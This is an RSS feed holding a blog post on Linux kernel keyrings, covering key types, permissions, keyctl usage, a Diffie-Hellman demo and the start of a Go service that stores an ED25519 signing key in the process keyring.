<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 0xcf9</title>
        <link>https://example.org/posts/</link>
        <description>Recent content in Posts on 0xcf9</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Thu, 12 Oct 2023 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://example.org/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Intro to Keyrings</title>
            <link>https://example.org/posts/10-keyrings-2023/</link>
            <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
            
            <guid>https://example.org/posts/10-keyrings-2023/</guid>
            <description>This is the third part of the series on securing applications on Linux. The first part was about Linux Seccompand the second part was about Linux Landlock. This third part is about Linux Keyrings.
What are Linux Keyrings? As usual we start citing the appropriate man page, keyrings(7):
The Linux key-management facility is primarily a way for various kernel components to retain or cache security data, authentication keys, encryption keys, and other data in the kernel System call interfaces are provided so that user-space programs can manage those objects and also use the facility for their own purposes; see add_key(2), request_key(2), and keyctl(2).</description>
            <content type="html"><![CDATA[<p>This is the third part of the series on securing applications on Linux. The first part was about Linux Seccompand the second part was about Linux Landlock. This third part is about Linux Keyrings.</p>
<h2 id="what-are-linux-keyrings">What are Linux Keyrings?</h2>
<p>As usual we start citing the appropriate man page, <a href="https://man7.org/linux/man-pages/man7/keyrings.7.html">keyrings(7)</a>:</p>
<pre tabindex="0"><code>The Linux key-management facility is primarily a way for various
kernel components to retain or cache security data,
authentication keys, encryption keys, and other data in the
kernel
System call interfaces are provided so that user-space programs
can manage those objects and also use the facility for their own
purposes; see add_key(2), request_key(2), and keyctl(2).
</code></pre><p>So, this means that we can use the kernel as a vault, storing secrets in it. There are various types of keys we can create:</p>
<ul>
<li>
<p>keyrings – are special keys to which other keys or keyrings can be linked to, they work almost as a directory, their purpose is to keep alive keys so that those keys are not garbage collected by the kernel</p>
</li>
<li>
<p>user – are keys which maximum size is 32,767 bytes, they are used to store user specific data and are managed by user
space applications</p>
</li>
<li>
<p>logon – similar to user keys except that cannot be read from user space, those are useful to store credentials such as user and password</p>
</li>
<li>
<p>big_key – similar to user except that they can be up to 1MiB in size, these kind of keys could may be stored on tmpfs</p>
</li>
</ul>
<p>We mentioned before that if a key is not anchored to a keyring it will be garbage collected by the kernel, so the kernel offers a way to keep keys alive, this is done by linking keys to a keyring. Notice that keyrings themselves can be garbage collected, so in turn also keyrings need to be anchored to another keyring. To solve this problem the kernel makes available some keyrings which sole purpose is to be used as anchors, these keyrings are:</p>
<ul>
<li>
<p>Process keyrings – we’ll look at them in a moment, since are the ones we’ll use in this article</p>
<ul>
<li>process-keyring(7)</li>
<li>thread-keyring(7)</li>
<li>session-keyring(7)</li>
</ul>
</li>
<li>
<p>User keyrings – these are per UID keyrings and are shared with all the processes spawned by the same UID</p>
<ul>
<li>user-keyring(7)</li>
<li>user-session-keyring(7)</li>
</ul>
</li>
<li>
<p>Persistence keyrings – these are keyrings which can persist across user sessions, so that programs that need to use    credentials to perform operations can get them without the need of a user session</p>
<ul>
<li>persistent-keyring(7)</li>
</ul>
</li>
<li>
<p>Special keyrings – thes are keyrings that holds system wide keys, such as the ones used for the kernel modules signature verification</p>
</li>
</ul>
<p>Notice that the one above is a short description and the reader is encouraged to check appropriate man pages to have a deeper understanding of the topic.</p>
<h2 id="process-keyrings">Process Keyrings</h2>
<p>These keyrings exist as anchoring keyring in order to be used by processes and threads. Their existence is directly bound to the process existence, so as long as the process is alive it will be possible to access the keyring. There are three types of process keyrings:</p>
<ul>
<li>
<p>process-keyring(7) – it is created when a process accesses it for the first time, and it is accessible by all the threads of the process, notice however that on execve(2) the keyring it is destroyed, and this makes perfectly sense as this syscall replaces entirely the process memory image</p>
</li>
<li>
<p>thread-keyring(7) – it is created when a thread accesses it for the first time, and it is accessible only by the thread that created it and gets destroyed when the thread terminates</p>
</li>
<li>
<p>session-keyring(7) – it is a process keyring that survives across clone(2), fork(2) and execve(2) syscalls, sessions can be joined by processes or new sessions can be created, usually a session keyring is created when user logs in and destroyed when user logs out</p>
</li>
</ul>
<h2 id="key-permissions">Key permissions</h2>
<p>Since keys are sensitive information, those must be protected by permissions. Permissions are security attributes attached to keys. Keys as files are owned by a user ID and group ID. Then on top of that there is a bitmask of permissions which detemines what can be done with the key by user ID, group ID and others. The permissions are:</p>
<ul>
<li>read – the key can be read</li>
<li>write – the key can be written</li>
<li>search – the key can be searched</li>
<li>link – the key can be linked to a keyring</li>
<li>setattr – the key attributes like owner, group, permission mask and timeout to be changed</li>
<li>view – allows to view type description and other parameters</li>
</ul>
<p>There’s also another access right called possessor which specifies rights granted if a key is determined to be possessed by the caller. keyctl(1) has a nice table which describes the access rights:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Possessor UID       GID       Other     Permission Granted
</span></span><span style="display:flex;"><span><span style="color:#f92672">========</span>  <span style="color:#f92672">========</span>  <span style="color:#f92672">========</span>  <span style="color:#f92672">========</span>  <span style="color:#f92672">==================</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01000000</span>  <span style="color:#ae81ff">00010000</span>  <span style="color:#ae81ff">00000100</span>  <span style="color:#ae81ff">00000001</span>  View
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02000000</span>  <span style="color:#ae81ff">00020000</span>  <span style="color:#ae81ff">00000200</span>  <span style="color:#ae81ff">00000002</span>  Read
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04000000</span>  <span style="color:#ae81ff">00040000</span>  <span style="color:#ae81ff">00000400</span>  <span style="color:#ae81ff">00000004</span>  Write
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08000000</span>  <span style="color:#ae81ff">00080000</span>  <span style="color:#ae81ff">00000800</span>  <span style="color:#ae81ff">00000008</span>  Search
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10000000</span>  <span style="color:#ae81ff">00100000</span>  <span style="color:#ae81ff">00001000</span>  <span style="color:#ae81ff">00000010</span>  Link
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">20000000</span>  <span style="color:#ae81ff">00200000</span>  <span style="color:#ae81ff">00002000</span>  <span style="color:#ae81ff">00000020</span>  Set Attribute
</span></span><span style="display:flex;"><span>3f000000  003f0000  00003f00  0000003f  All
</span></span></code></pre></div><p>So suppose we want to give all privileges to UID and Possessor, and view + read to the others we would do set its permissions to 0x3f3f0303.</p>
<p>The kernel exposes key information through the /proc/keys file and other multiple files described into keyrings(7) manpage. Let’s take a look at it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /proc/keys
</span></span><span style="display:flex;"><span>05451ea7 I--Q---     <span style="color:#ae81ff">4</span> perm 1f3f0000  <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">65534</span> keyring   _uid.1000: empty
</span></span><span style="display:flex;"><span>14f7afae I--Q---     <span style="color:#ae81ff">1</span> perm 1f3f0000  <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">65534</span> keyring   _uid_ses.1000: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>293d8fc8 I--Q---    <span style="color:#ae81ff">15</span> perm 3f030000  <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span> keyring   _ses: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>3b3232a6 I--Q---   <span style="color:#ae81ff">376</span> perm 3f030000  <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span> keyring   _ses: <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>The first column is the key ID, keys are represented as 32bit integers, in this view are formatted in hexadecimal. The second column shows flags, in this case all the keys are instantiated (I) and contribute to the user quota (Q). The third column tells how many struct cred are pinning that specific key, which approximately is the number of living threads and open files. The fourth column tells when the key will expire (all the keys here are marked as perm which means permanent). The fifth column is the permissions bitmask. The sixth column is the UID of the key owner. The seventh column is the GID of the key owner. The eighth column is the key type. The ninth column is the description of the key.</p>
<h2 id="how-to-use-linux-keyrings">How to use Linux Keyrings?</h2>
<p>Linux provides a tool named keyctl which can be used to create/delete/update keys and keyrings. Let’s see how to use it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># create a new keyring attached to the default session (@s) one, and name it my_keyring</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># notice that @s is created on user login and destroyed on logout, the command returns</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the key ID of the newly created keyring</span>
</span></span><span style="display:flex;"><span>$  keyctl newring my_keyring @s
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">740991106</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># show the default session keyring, notice that the keyring we created is attached to it</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># along with the user keyring</span>
</span></span><span style="display:flex;"><span>$  keyctl show @s
</span></span><span style="display:flex;"><span>Keyring
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">993145510</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>  keyring: _ses
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">88415911</span> --alswrv   <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">65534</span>   <span style="color:#ae81ff">\_</span> keyring: _uid.1000
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">740991106</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">\_</span> keyring: my_keyring
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># add a new key (we generate it randomly with openssl) to the keyring we created,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># as for the keyring command, this command returns the key ID of the newly created key</span>
</span></span><span style="display:flex;"><span>$  keyctl add user my_key <span style="color:#f92672">(</span>openssl rand 32<span style="color:#f92672">)</span> <span style="color:#ae81ff">740991106</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1032028779</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># show the keyring again, notice that the key we created is attached to it</span>
</span></span><span style="display:flex;"><span>$  keyctl show @s
</span></span><span style="display:flex;"><span>Keyring
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">993145510</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>  keyring: _ses
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">88415911</span> --alswrv   <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">65534</span>   <span style="color:#ae81ff">\_</span> keyring: _uid.1000
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">740991106</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">\_</span> keyring: my_keyring
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1032028779</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>       <span style="color:#ae81ff">\_</span> user: my_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># show the key we created</span>
</span></span><span style="display:flex;"><span>$ keyctl read <span style="color:#ae81ff">1032028779</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span> bytes of data in key:
</span></span><span style="display:flex;"><span>e2362872 8b32fc4f bb6eca6d 4f90be31 4b84a6ed cfd4535a c4d66991 0d2eb2bc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we can also pipe data in raw format to other applications</span>
</span></span><span style="display:flex;"><span>$ keyctl pipe <span style="color:#ae81ff">1032028779</span> | hexyl
</span></span><span style="display:flex;"><span>┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
</span></span><span style="display:flex;"><span>│00000000│ e2 <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">72</span> 8b <span style="color:#ae81ff">32</span> fc 4f ┊ bb 6e ca 6d 4f <span style="color:#ae81ff">90</span> be <span style="color:#ae81ff">31</span> │×6<span style="color:#f92672">(</span>r×2×O┊×n×mO××1│
</span></span><span style="display:flex;"><span>│00000010│ 4b <span style="color:#ae81ff">84</span> a6 ed cf d4 <span style="color:#ae81ff">53</span> 5a ┊ c4 d6 <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">91</span> 0d 2e b2 bc │K×××××SZ┊××i×_.××│
</span></span><span style="display:flex;"><span>└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘
</span></span></code></pre></div><p>Before we move on with Go code, we’re going to show another example to compute Diffie-Hellman directly using keyrings feature.</p>
<p>This is our private key in hex</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0f6f7590dcee920ca7a1f9dc8ff94e
</span></span><span style="display:flex;"><span>87e4484b223d1fd57d3ee00a2f4616
</span></span><span style="display:flex;"><span>a03a0152cafa5289676aed7291c75b
</span></span><span style="display:flex;"><span>b031b4357a75698129dfbb4ca5e799
</span></span><span style="display:flex;"><span>a34c545b8fe77fb5926e9184222a08
</span></span><span style="display:flex;"><span>30f916ac7aef551c5fcd67722595df
</span></span><span style="display:flex;"><span>aaa6098595a190bd461bee0ee9bbb0
</span></span><span style="display:flex;"><span>1ea9ef24f3590ec3b036862c787e16
</span></span><span style="display:flex;"><span>b855bfb05863083b99bd7de0dcae78
</span></span><span style="display:flex;"><span>9422c87f6f030a02818b1ae63b7f1e
</span></span><span style="display:flex;"><span>b6c6036de0a6b7f653c000cc1d0c54
</span></span><span style="display:flex;"><span>7ecb9c5c0da71f5fafe7dd1c88fba7
</span></span><span style="display:flex;"><span>35266bc0768043ba86fc86e8a41625
</span></span><span style="display:flex;"><span>55ccc2e6806d882964997ea87533a2
</span></span><span style="display:flex;"><span>37b0c617cb222c90418ded933e9eee
</span></span><span style="display:flex;"><span>fa462dd0157471b24612d4c8622650
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">60</span>
</span></span></code></pre></div><p>This is our prime module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fe4e0bd59f860a8eda80ad8663ad1d
</span></span><span style="display:flex;"><span>3b55e19670a1a43d9e203428ca2794
</span></span><span style="display:flex;"><span>ba934cb8d6ba2233faf96ef6c6a14a
</span></span><span style="display:flex;"><span>5267de1d46108cf9341f0e1959bb54
</span></span><span style="display:flex;"><span>2197d18076b51ceab3a249b2eacf13
</span></span><span style="display:flex;"><span>2e453c64b4cdd089c295d2eda1200f
</span></span><span style="display:flex;"><span>9f34627f5b7c3462a94f6e66ba6d5d
</span></span><span style="display:flex;"><span>5f253d4420343a095ace2d1e10e194
</span></span><span style="display:flex;"><span>0e291dda82557d89903683799bb4b8
</span></span><span style="display:flex;"><span>f777a5471cbd1e452f3a8f8bb12347
</span></span><span style="display:flex;"><span>f1f93e7da6f37f0f2b598c5eea2481
</span></span><span style="display:flex;"><span>7c5a00197012e8b2c269c294d6de0b
</span></span><span style="display:flex;"><span>853b25517f6d33e861fae1df79bda9
</span></span><span style="display:flex;"><span>96785b5fc1527dafdd25a9d369c2d1
</span></span><span style="display:flex;"><span>3714be41e9ee78080b7f9e5bb7a056
</span></span><span style="display:flex;"><span>564c14cf5567b8b32eb1caa0579df2
</span></span><span style="display:flex;"><span>301f
</span></span></code></pre></div><p>And this is our generator</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">02</span>
</span></span></code></pre></div><p>So lets say we want to generate our public key doing <code>(generator ^ private_key) mod prime_module</code>, we can do it with the following code. Notice that in this example before loading our parameters and key we need to generate those. This can be achievied with openssl as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl dhparam -check -out dh.pem <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>openssl genpkey -paramfile dh.pem -text
</span></span></code></pre></div><p>Then you’ve to adjust a bit the format like removing the ‘:’ between hex bytes and then exporting the values e.g., as environment variables (do not forget to unset once loaded in the keyring, otherwise we’re voiding the purpose of using keyrings). Moreover consider this is just an example using the keyctl commandline tool, we could achieve the same result using APIs.</p>
<p>Once we’ve our params as env variable we can proceed with the following commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># we first load the prime module, the private key and the generator in the keyring</span>
</span></span><span style="display:flex;"><span>keyctl add user prime $prime @s
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">261425615</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>keyctl add user priv_key $priv_key @s
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195168655</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>keyctl add user generator $generator @s
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">688070769</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># lets show the keyring</span>
</span></span><span style="display:flex;"><span>keyctl show @s
</span></span><span style="display:flex;"><span>Keyring
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">611679097</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>  keyring: _ses
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">504006137</span> --alswrv   <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">65534</span>   <span style="color:#ae81ff">\_</span> keyring: _uid.1000
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">688070769</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">\_</span> user: generator
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">195168655</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">\_</span> user: priv_key
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">261425615</span> --alswrv   <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">\_</span> user: prime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we then compute the public key doing &#39;keyctl dh_compute &lt;private&gt; &lt;prime&gt; &lt;base&gt;&#39;</span>
</span></span><span style="display:flex;"><span>keyctl dh_compute <span style="color:#ae81ff">195168655</span> <span style="color:#ae81ff">261425615</span> <span style="color:#ae81ff">688070769</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">520</span> bytes of data in result:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span> 00001b1c 0babf483 2a611efd 3051e63d 03d3f202 c2707669 5fc00072
</span></span><span style="display:flex;"><span>64bbfbef 40ab3706 b59ac8ae 2402f65f 69a96dd0 a1569c65 13f6b9fc 45f9d810
</span></span><span style="display:flex;"><span>d0229ba8 fcaed84d bce5a67e 32d0dac5 1e21c838 65f71921 ce6e07e4 72ae49b3
</span></span><span style="display:flex;"><span>7b26c507 8ec0c502 776946d8 06f2aac7 9cabe6fe bca5edd3 58e861ab 6099a39f
</span></span><span style="display:flex;"><span>d1c703cd a0b677d3 5fbd1e99 d80ec614 5ea1273d bcd8ce1a 93a0499f 485545a3
</span></span><span style="display:flex;"><span>eaeb6630 f4d30a3f 22ba90fa b415b6a2 aa4772ca d28f11e1 729625f5 13dde521
</span></span><span style="display:flex;"><span>af21aaf9 4746d52a 08e65b29 3982e708 4f3ba400 cfc5decb 45c2409f a0c12987
</span></span><span style="display:flex;"><span>d38d5ac9 8e8cdcad 0777b523 c36e2526 659fbce2 06e385a4 d9379ba4 7343dbca
</span></span><span style="display:flex;"><span>0df0db4a 4df84609 dc57bb99 16a75023 8596d4b1 26e4a9aa ec3a7187 b0f44ba0
</span></span><span style="display:flex;"><span>283472cf 9a33c5be 32ee170c c190c649 9805d24c 8071b810 d535cf2b 8937eb43
</span></span><span style="display:flex;"><span>10456d83 f978d7de ca222f30 74386a86 df76e34f c71328f6 f49e6a0e 36b540f3
</span></span><span style="display:flex;"><span>35dac266 cbb86490 dfa3cf7a <span style="color:#ae81ff">45889447</span> b7aed36d de1a2ac2 0222bc6f 5a4ec429
</span></span><span style="display:flex;"><span>04caac37 fbedfc99 913c593c 55908c07 760d5fd2 105d63f1 febfd782 fd62ef9d
</span></span><span style="display:flex;"><span>c2e1bf99 e2e759cc 5eddbe74 29dd68b7 f37143e7 9a84e4e3 209f8ba1 cbc42e48
</span></span><span style="display:flex;"><span>e4ecf652 7ce86b21 f3bf6d32 <span style="color:#ae81ff">22843038</span> 2095ae19 4b39679c 33fecad3 f393b057
</span></span><span style="display:flex;"><span>60457f3d 8e68c024 505d9ae2 edb25a2b 111663a5 905b2d3f 629c749c a64659e0
</span></span><span style="display:flex;"><span>910d1a7b 6432833c
</span></span></code></pre></div><h2 id="using-keyrings-in-go">Using Keyrings in Go</h2>
<p>In the following Go example code, we illustrate how we can use keyring facilities to store an ED25519 private key. The key is then used to sign and verify (with its public counterpart) a payload. We’re going to use the golang/x/unix package to interact with the kernel keyring, as it provides syscalls wrappers, and the crypto/ed25519 package to create/parse keys, sign and verify the payload.</p>
<p>The Go code, creates an HTTP service which exposes two endpoints:</p>
<ul>
<li>/generate → forges a simple JSON payload with some data and its ED25519 base64 encoded signature e.g,:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;payload&#34;</span>:<span style="color:#e6db74">&#34;some_data_1693390750&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;signature&#34;</span>:<span style="color:#e6db74">&#34;QO1mZet+wpgODp+fs8PbfHvKqYBrX2OGxfxDyT8e+tH7DBVyBUafFNCTCbEiFrhm0urgrON9GkQBdv/0REpIBw==&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>/verify → accepts the above payload computes the payload field signature and compares it with the one in the signature field</li>
</ul>
<p>When the service bootstraps it generates a new ED25519 key and stores it in the process keyring, then it sets the permissions on the keyring and on the key so that it can be accessed by other threads in the process. The the endpoints described above make use of some utilities functions to retrieve and use the key to perform sign and verify.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/ed25519&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encoding/base64&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net/http&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log/slog&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/sys/unix&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// this is the description of the key we&#39;re going to store in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keyName</span> = <span style="color:#e6db74">&#34;priv_ed25519_key&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// this is our process keyring ID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// it initialized in main()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">ringId</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ServicePayload is the payload we&#39;re going to use to communicate with the service
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">ServicePayload</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Signature</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;signature&#34;`</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Payload</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;payload&#34;`</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get id of the process keyring or create a new one if it does not exist
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// check keyctl(2) KEYCTL_GET_KEYRING_ID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ringId</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KeyctlGetKeyringID</span>(<span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KEY_SPEC_PROCESS_KEYRING</span>, <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// set following permissions to the keyring:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// * possesor all
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// * process with possessor uid view/read/search
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// check keyctl(2) KEYCTL_SETPERM
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KeyctlSetperm</span>(<span style="color:#a6e22e">ringId</span>, <span style="color:#ae81ff">0x3f0b0000</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// generate a new key ED25519 key and store it in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">generateAndStorePrivKey</span>(<span style="color:#a6e22e">ringId</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// start our HTTP service
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">startService</span>()
</span></span><span style="display:flex;"><span>}
